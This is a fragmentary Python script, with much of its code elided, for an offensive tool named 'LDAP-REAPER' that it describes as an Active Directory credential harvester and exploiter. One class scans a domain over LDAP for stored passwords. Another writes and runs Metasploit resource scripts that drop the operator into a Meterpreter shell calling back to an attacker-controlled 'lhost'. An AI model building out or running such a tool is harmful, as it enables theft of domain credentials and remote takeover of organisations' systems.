...
TARGET_CONFIG = {
    ...
    'lhost': '192.168.56.1'  # YOUR Attacker IP
}
...
class ExploitEngine:
    ...
    def generate_rc(self, target_user, target_pass):
        """Generates the Metasploit Resource Script."""
        filename = f"attack_{target_user}.rc"
        
        # We drop the user right into an active Meterpreter prompt
        rc_content = f"""
        ...
        with open(filename, "w") as f:
            f.write(rc_content.strip()) # Removed leading whitespace
        return filename

    def launch(self, rc_file):
        """Executes the attack via Metasploit."""
...
class LDAPHunter:
    def __init__(self, config):
        ...
        # Make the search base dynamic for ANY domain length (e.g. corp.lab.local)
    ...
    def hunt_passwords(self):
        ...
        print(f"[*] Scanning domain '{self.config['domain']}' for credentials...")
        ...
        if self.conn.entries:
            for entry in self.conn.entries:
                ...
                # SAFELY extract the string values, avoiding the "['value']" list formatting issue
...
if __name__ == '__main__':
    print("=== LDAP-REAPER v1.0 ===")
    print("Automated Active Directory Credential Harvester & Exploiter\n")
    
    reaper = LDAPHunter(TARGET_CONFIG)
    if reaper.connect():
        reaper.hunt_passwords()
